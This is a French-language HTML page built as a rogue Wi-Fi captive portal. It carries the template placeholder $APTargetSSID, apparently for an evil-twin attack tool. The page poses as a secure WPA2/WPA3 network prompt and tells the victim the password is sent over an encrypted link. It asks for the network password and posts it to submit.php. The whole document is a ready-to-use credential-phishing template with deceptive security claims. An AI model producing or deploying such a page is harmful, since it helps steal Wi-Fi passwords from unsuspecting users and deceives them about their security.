<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#050b18">
<meta name="robots" content="noindex">
<title>Réseau Wi-Fi</title>
<style>
  *, *::before, *::after { box-sizing: border-box; }
  :root {
    --ink: #eef6ff;
    --muted: #8ea4c2;
    --soft: #6f85a3;
    --line: rgba(148, 190, 255, .16);
    --line-strong: rgba(96, 165, 250, .42);
    --blue: #3b82f6;
    --cyan: #22d3ee;
    --green: #34d399;
    --red: #f87171;
    --card: rgba(10, 22, 43, .78);
  }
  html { background: #050b18; }
  body {
    margin: 0;
    min-height: 100vh;
    min-height: 100svh;
    display: grid;
    place-items: center;
    padding: 26px 18px calc(22px + env(safe-area-inset-bottom));
    overflow-x: hidden;
    background: #050b18;
    color: var(--ink);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    -webkit-text-size-adjust: 100%;
  }
  .scene { position: fixed; inset: 0; z-index: -2; overflow: hidden; background:
    radial-gradient(ellipse 80% 70% at 50% -10%, #0b2247 0%, #07152d 38%, #050b18 68%, #03070f 100%); }
  .scene::after {
    content: "";
    position: absolute;
    inset: 0;
    background-image:
      linear-gradient(rgba(148, 190, 255, .045) 1px, transparent 1px),
      linear-gradient(90deg, rgba(148, 190, 255, .045) 1px, transparent 1px);
    background-size: 54px 54px;
    -webkit-mask-image: radial-gradient(circle at 50% 42%, #000 0%, transparent 72%);
    mask-image: radial-gradient(circle at 50% 42%, #000 0%, transparent 72%);
    opacity: .75;
  }
  .orb { position: absolute; border-radius: 50%; filter: blur(78px); opacity: .48; animation: drift 20s ease-in-out infinite alternate; }
  .orb-a { width: 430px; height: 430px; top: -190px; left: -150px; background: #1d4ed8; }
  .orb-b { width: 380px; height: 380px; right: -170px; bottom: -140px; background: #0891b2; animation-delay: -7s; }
  .orb-c { width: 260px; height: 260px; top: 44%; left: 58%; background: #6d28d9; opacity: .28; animation-delay: -13s; }

  .shell { width: 100%; max-width: 430px; display: flex; flex-direction: column; align-items: center; }
  .card {
    position: relative;
    width: 100%;
    padding: 22px 23px 23px;
    overflow: hidden;
    border: 1px solid var(--line);
    border-radius: 28px;
    background: linear-gradient(180deg, rgba(17, 34, 62, .84) 0%, var(--card) 58%, rgba(6, 14, 29, .9) 100%);
    box-shadow: 0 40px 100px rgba(0, 0, 0, .58), 0 2px 0 rgba(255, 255, 255, .04) inset;
    -webkit-backdrop-filter: blur(24px) saturate(135%);
    backdrop-filter: blur(24px) saturate(135%);
  }
  .card::before {
    content: "";
    position: absolute;
    top: 0;
    left: 15%;
    right: 15%;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(125, 211, 252, .85), transparent);
  }
  .topbar { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
  .brand { display: flex; align-items: center; gap: 10px; min-width: 0; }
  .brand-mark {
    width: 38px;
    height: 38px;
    display: grid;
    place-items: center;
    flex: none;
    border-radius: 12px;
    background: linear-gradient(145deg, #3b82f6, #0891b2);
    box-shadow: 0 8px 20px rgba(37, 99, 235, .32), 0 1px 0 rgba(255, 255, 255, .28) inset;
  }
  .brand-mark svg { width: 21px; height: 21px; display: block; }
  .brand-name { font-size: 15px; font-weight: 750; letter-spacing: .1px; line-height: 1.15; }
  .brand-sub { margin-top: 2px; color: var(--muted); font-size: 10.5px; letter-spacing: .2px; }
  .secure-pill {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    flex: none;
    padding: 6px 9px;
    border: 1px solid rgba(52, 211, 153, .2);
    border-radius: 999px;
    background: rgba(16, 185, 129, .08);
    color: #a7f3d0;
    font-size: 9.5px;
    font-weight: 700;
    letter-spacing: .45px;
    text-transform: uppercase;
    white-space: nowrap;
  }
  .secure-pill i {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 0 4px rgba(52, 211, 153, .12), 0 0 12px rgba(52, 211, 153, .8);
  }

  .network {
    position: relative;
    display: flex;
    align-items: center;
    gap: 15px;
    margin-top: 22px;
    padding: 17px;
    overflow: hidden;
    border: 1px solid rgba(96, 165, 250, .2);
    border-radius: 20px;
    background: linear-gradient(135deg, rgba(37, 99, 235, .19), rgba(8, 145, 178, .09) 65%, rgba(15, 23, 42, .15));
  }
  .network::after {
    content: "";
    position: absolute;
    width: 130px;
    height: 130px;
    top: -70px;
    right: -45px;
    border-radius: 50%;
    background: rgba(34, 211, 238, .15);
    filter: blur(24px);
  }
  .radar { position: relative; width: 62px; height: 62px; flex: none; display: grid; place-items: center; }
  .ring { position: absolute; border: 1px solid rgba(56, 189, 248, .3); border-radius: 50%; animation: pulse 3.2s ease-out infinite; }
  .ring-1 { inset: 0; }
  .ring-2 { inset: 8px; animation-delay: .55s; }
  .ring-3 { inset: 16px; animation-delay: 1.1s; }
  .core {
    position: relative;
    z-index: 1;
    width: 38px;
    height: 38px;
    display: grid;
    place-items: center;
    border-radius: 13px;
    background: linear-gradient(145deg, #38bdf8, #2563eb);
    box-shadow: 0 8px 18px rgba(14, 165, 233, .35), 0 1px 0 rgba(255, 255, 255, .35) inset;
  }
  .core svg { width: 21px; height: 21px; display: block; }
  .network-copy { position: relative; z-index: 1; min-width: 0; flex: 1; }
  .eyebrow { margin: 0 0 3px; color: #7dd3fc; font-size: 9.5px; font-weight: 750; letter-spacing: 1px; text-transform: uppercase; }
  .ssid {
    margin: 0;
    overflow: hidden;
    color: #fff;
    font-size: 19px;
    font-weight: 750;
    line-height: 1.25;
    letter-spacing: -.35px;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .chips { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 8px; }
  .chip {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 4px 7px;
    border: 1px solid rgba(148, 190, 255, .12);
    border-radius: 7px;
    background: rgba(2, 8, 20, .3);
    color: #aec4df;
    font-size: 9.5px;
    font-weight: 650;
    line-height: 1;
    white-space: nowrap;
  }
  .chip svg { width: 11px; height: 11px; display: block; color: #67e8f9; }

  .form-title { margin: 24px 0 7px; color: #fff; font-size: 23px; font-weight: 750; line-height: 1.2; letter-spacing: -.65px; }
  .lead { margin: 0 0 19px; color: var(--muted); font-size: 13px; line-height: 1.55; }
  form { margin: 0; }
  .field-label { display: flex; align-items: center; justify-content: space-between; gap: 10px; color: #b7c8de; font-size: 11.5px; font-weight: 650; }
  .field-label span:last-child { color: #647a97; font-size: 10px; font-weight: 500; }
  .input-wrap {
    position: relative;
    display: flex;
    align-items: center;
    height: 55px;
    margin-top: 7px;
    border: 1px solid var(--line);
    border-radius: 16px;
    background: rgba(3, 10, 23, .52);
    transition: border-color .18s ease, box-shadow .18s ease, background-color .18s ease;
  }
  .input-wrap:focus-within {
    border-color: var(--line-strong);
    background: rgba(3, 10, 23, .72);
    box-shadow: 0 0 0 4px rgba(56, 189, 248, .09), 0 0 28px rgba(56, 189, 248, .08);
  }
  .key-icon { position: absolute; left: 15px; width: 18px; height: 18px; color: #6e86a5; pointer-events: none; }
  .key-icon svg { width: 18px; height: 18px; display: block; }
  .input-wrap input {
    width: 100%;
    height: 100%;
    padding: 0 52px 0 44px;
    border: 0;
    background: transparent;
    color: #f8fbff;
    font-family: inherit;
    font-size: 16px;
    outline: none;
    -webkit-appearance: none;
    appearance: none;
  }
  .input-wrap input::placeholder { color: #5f7490; font-size: 14.5px; }
  .toggle {
    position: absolute;
    right: 7px;
    width: 38px;
    height: 38px;
    display: grid;
    place-items: center;
    border: 0;
    border-radius: 11px;
    background: transparent;
    color: #7890ad;
    cursor: pointer;
    transition: background-color .15s ease, color .15s ease;
  }
  .toggle:hover { background: rgba(148, 190, 255, .09); color: #dcecff; }
  .toggle svg { width: 19px; height: 19px; display: block; }
  .toggle .eye-off { display: none; }
  .toggle.is-visible .eye { display: none; }
  .toggle.is-visible .eye-off { display: block; }
  .row { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin: 12px 1px 18px; }
  .remember { display: inline-flex; align-items: center; gap: 7px; color: #8ea4c2; font-size: 10.5px; cursor: pointer; user-select: none; }
  .remember input {
    width: 16px;
    height: 16px;
    margin: 0;
    display: grid;
    place-content: center;
    border: 1px solid rgba(148, 190, 255, .28);
    border-radius: 5px;
    background: rgba(3, 10, 23, .5);
    -webkit-appearance: none;
    appearance: none;
    cursor: pointer;
  }
  .remember input::after {
    content: "";
    width: 8px;
    height: 4px;
    border-left: 2px solid #04101f;
    border-bottom: 2px solid #04101f;
    transform: rotate(-45deg) translateY(-1px) scale(0);
    transition: transform .12s ease;
  }
  .remember input:checked { border-color: #38bdf8; background: linear-gradient(145deg, #38bdf8, #22d3ee); }
  .remember input:checked::after { transform: rotate(-45deg) translateY(-1px) scale(1); }
  .help { color: #7dd3fc; font-size: 10.5px; font-weight: 600; text-decoration: none; }
  .help:hover { color: #c7f5ff; }
  .submit {
    position: relative;
    width: 100%;
    height: 54px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    border: 0;
    border-radius: 16px;
    background: linear-gradient(135deg, #60a5fa 0%, #22d3ee 100%);
    color: #03101f;
    font: 800 15px/1 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    cursor: pointer;
    box-shadow: 0 15px 32px rgba(37, 99, 235, .3), 0 1px 0 rgba(255, 255, 255, .45) inset;
    transition: transform .16s ease, opacity .16s ease, filter .16s ease, box-shadow .16s ease;
  }
  .submit:not(.ready) { opacity: .48; filter: saturate(.45); box-shadow: none; }
  .submit.ready:hover { transform: translateY(-1px); box-shadow: 0 19px 38px rgba(37, 99, 235, .4), 0 1px 0 rgba(255, 255, 255, .5) inset; }
  .submit:active { transform: translateY(0); }
  .submit .arrow { width: 17px; height: 17px; display: block; transition: transform .16s ease; }
  .submit.ready:hover .arrow { transform: translateX(3px); }
  .spinner { display: none; width: 17px; height: 17px; border: 2px solid rgba(3, 16, 31, .3); border-top-color: #03101f; border-radius: 50%; animation: spin .7s linear infinite; }
  .submit.is-loading { pointer-events: none; opacity: .85; }
  .submit.is-loading .arrow { display: none; }
  .submit.is-loading .spinner { display: block; }
  .privacy { display: flex; align-items: center; justify-content: center; gap: 6px; margin: 15px 0 0; color: var(--soft); font-size: 10.5px; }
  .privacy svg { width: 12px; height: 12px; display: block; color: #4ade80; }
  .foot { margin: 17px 4px 0; color: #526887; font-size: 10.5px; line-height: 1.5; text-align: center; }

  @keyframes drift {
    0% { transform: translate3d(0, 0, 0) scale(1); }
    100% { transform: translate3d(26px, 18px, 0) scale(1.12); }
  }
  @keyframes pulse {
    0% { transform: scale(.82); opacity: .7; }
    70%, 100% { transform: scale(1.15); opacity: 0; }
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  @media (max-width: 380px) {
    body { padding-left: 13px; padding-right: 13px; }
    .card { padding: 19px 18px 20px; border-radius: 24px; }
    .secure-pill { font-size: 8.5px; padding: 5px 7px; }
    .form-title { font-size: 21px; }
    .network { gap: 12px; padding: 14px; }
    .radar { width: 56px; height: 56px; }
    .ssid { font-size: 17px; }
  }
  @media (prefers-reduced-motion: reduce) {
    *, *::before, *::after { animation-duration: .001ms !important; animation-iteration-count: 1 !important; transition-duration: .001ms !important; }
  }
</style>
</head>
<body>
  <div class="scene" aria-hidden="true">
    <span class="orb orb-a"></span>
    <span class="orb orb-b"></span>
    <span class="orb orb-c"></span>
  </div>

  <main class="shell">
    <section class="card">
      <div class="topbar">
        <div class="brand">
          <span class="brand-mark" aria-hidden="true">
            <svg viewBox="0 0 24 24" fill="none">
              <path d="M3.4 8.9a13.4 13.4 0 0 1 17.2 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
              <path d="M6.5 12.4a8.6 8.6 0 0 1 11 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
              <path d="M9.6 15.9a3.8 3.8 0 0 1 4.8 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
              <circle cx="12" cy="19.2" r="1.35" fill="#fff"/>
            </svg>
          </span>
          <span>
            <span class="brand-name">Wi-Fi</span>
            <span class="brand-sub" style="display:block">Réseau sans fil</span>
          </span>
        </div>
        <span class="secure-pill"><i></i>Sécurisé</span>
      </div>

      <div class="network">
        <div class="radar" aria-hidden="true">
          <span class="ring ring-1"></span>
          <span class="ring ring-2"></span>
          <span class="ring ring-3"></span>
          <span class="core">
            <svg viewBox="0 0 24 24" fill="none">
              <path d="M3.4 8.9a13.4 13.4 0 0 1 17.2 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
              <path d="M6.5 12.4a8.6 8.6 0 0 1 11 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
              <path d="M9.6 15.9a3.8 3.8 0 0 1 4.8 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
              <circle cx="12" cy="19.2" r="1.35" fill="#fff"/>
            </svg>
          </span>
        </div>
        <div class="network-copy">
          <p class="eyebrow">Réseau à rejoindre</p>
          <p class="ssid">$APTargetSSID</p>
          <div class="chips">
            <span class="chip">WPA2 / WPA3</span>
            <span class="chip">
              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
                <path d="M4 17.5v-3.2M9.3 17.5V10m5.4 7.5V7.2M20 17.5V4.5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
              </svg>
              Signal fort
            </span>
          </div>
        </div>
      </div>

      <h1 class="form-title">Saisissez le mot de passe Wi-Fi</h1>
      <p class="lead">Vérifiez le mot de passe du réseau pour accéder à ce réseau sans fil.</p>

      <form action="submit.php" method="post" id="wifiForm" autocomplete="off">
        <label class="field-label" for="password">
          <span>Mot de passe du réseau</span>
          <span>Sensible à la casse</span>
        </label>
        <div class="input-wrap">
          <span class="key-icon" aria-hidden="true">
            <svg viewBox="0 0 24 24" fill="none">
              <circle cx="8.2" cy="12" r="3.7" stroke="currentColor" stroke-width="1.8"/>
              <path d="M11.9 12h8M16.5 12v2.2M19 12v3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
            </svg>
          </span>
          <input id="password" name="password" type="password"
                 placeholder="Saisissez votre mot de passe Wi-Fi"
                 autocapitalize="none" autocorrect="off" spellcheck="false"
                 autocomplete="off" required>
          <button type="button" class="toggle" id="togglePassword"
                  aria-label="Afficher le mot de passe" aria-pressed="false">
            <svg class="eye" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M2.7 12s3.4-6 9.3-6 9.3 6 9.3 6-3.4 6-9.3 6S2.7 12 2.7 12Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
              <circle cx="12" cy="12" r="2.7" stroke="currentColor" stroke-width="1.8"/>
            </svg>
            <svg class="eye-off" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M4.2 4.2l15.6 15.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
              <path d="M9.9 6.4A10.7 10.7 0 0 1 12 6.1c5.9 0 9.3 5.9 9.3 5.9a17 17 0 0 1-3 3.5M14.4 17.7c-.8.2-1.6.3-2.4.3-5.9 0-9.3-6-9.3-6a17.3 17.3 0 0 1 3.4-3.8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </button>
        </div>

        <div class="row">
          <label class="remember">
            <input type="checkbox" name="remember" value="1">
            <span>Mémoriser ce réseau</span>
          </label>
          <a class="help" href="#">Aide</a>
        </div>

        <button type="submit" id="submitBtn" class="submit">
          <span class="btn-text">Rejoindre le réseau</span>
          <svg class="arrow" viewBox="0 0 24 24" fill="none" aria-hidden="true">
            <path d="M5 12h13M13 6.5 18.5 12 13 17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          <span class="spinner" aria-hidden="true"></span>
        </button>
      </form>

      <p class="privacy">
        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <rect x="5" y="10.3" width="14" height="9.6" rx="2.4" stroke="currentColor" stroke-width="1.8"/>
          <path d="M8.4 10.3V7.9a3.6 3.6 0 0 1 7.2 0v2.4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
        </svg>
        Votre mot de passe est transmis via un lien chiffré.
      </p>
    </section>

    <p class="foot">Connexion sécurisée · WPA2/WPA3</p>
  </main>

  <script>
    (function () {
      var form = document.getElementById('wifiForm');
      var input = document.getElementById('password');
      var button = document.getElementById('submitBtn');
      var label = button.querySelector('.btn-text');
      var toggle = document.getElementById('togglePassword');

      function sync() {
        button.classList.toggle('ready', input.value.length > 0);
      }
      input.addEventListener('input', sync);
      sync();

      toggle.addEventListener('click', function () {
        var visible = input.type === 'text';
        input.type = visible ? 'password' : 'text';
        toggle.classList.toggle('is-visible', !visible);
        toggle.setAttribute('aria-pressed', String(!visible));
        toggle.setAttribute('aria-label', !visible ? 'Masquer le mot de passe' : 'Afficher le mot de passe');
        input.focus();
      });

      form.addEventListener('submit', function () {
        button.classList.add('is-loading');
        button.setAttribute('aria-busy', 'true');
        label.textContent = 'Connexion…';
      });
    }());
  </script>
</body>
</html>
